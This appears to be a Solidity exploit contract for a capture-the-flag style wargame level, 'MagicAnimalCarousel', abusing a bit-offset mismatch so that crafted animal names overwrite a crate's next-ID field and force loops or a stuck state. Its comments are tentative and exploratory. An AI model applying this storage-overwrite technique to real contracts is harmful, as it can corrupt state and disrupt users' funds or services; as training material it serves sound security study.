// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract CarouselExploit2 {
    MagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = MagicAnimalCarousel(_target);
    }
    
    function exploit() external {
        // The vulnerability is that setAnimalAndSpin stores animal at bit 176
        // but changeAnimal stores it at bit 160, overwriting the next crate ID
        
        // First, let's move to crate 1
        target.setAnimalAndSpin("test");
        
        // Now currentCrateId = 1
        // Let's change the animal to overwrite next crate ID
        // We want to make the next crate ID = 0 to create a cycle back to start
        
        // The animal name is encoded and shifted left by 160 bits in changeAnimal
        // So the first 2 bytes of the encoded animal become bits 160-175 (the next crate ID)
        
        // To set next crate ID to 0, we need the first 2 bytes to be 0x0000
        bytes memory zeroBytes = hex"0000000000000000000000";
        target.changeAnimal(string(zeroBytes), 1);
        
        // Now crate 1 should point back to crate 0
        // Let's spin again to see if we go to crate 0
        target.setAnimalAndSpin("loop");
        
        // Check if currentCrateId is 0
        uint256 current = target.currentCrateId();
        if (current == 0) {
            // We successfully created a loop!
            // Now let's try to break it further
            
            // Change crate 0 to point to itself
            target.changeAnimal(string(hex"0000000000000000000000"), 0);
        }
    }
    
    function makeCratePointToItself(uint256 crateId) external {
        // Make a crate point to itself by encoding the crate ID in the animal name
        bytes memory payload = new bytes(12);
        payload[0] = bytes1(uint8(crateId >> 8)); // high byte
        payload[1] = bytes1(uint8(crateId & 0xFF)); // low byte
        
        target.changeAnimal(string(payload), crateId);
    }
    
    function breakCarousel() external {
        // Maybe the goal is to make currentCrateId stuck at 0
        // Let's make crate 0 point to itself
        
        // First ensure we're at crate 0
        if (target.currentCrateId() != 0) {
            target.setAnimalAndSpin("move");
        }
        
        // Now change crate 0 to point to itself (next = 0)
        bytes memory zeroPayload = hex"000000000000000000000000";
        target.changeAnimal(string(zeroPayload), 0);
        
        // Try to spin - it should stay at 0
        target.setAnimalAndSpin("stuck");
    }
}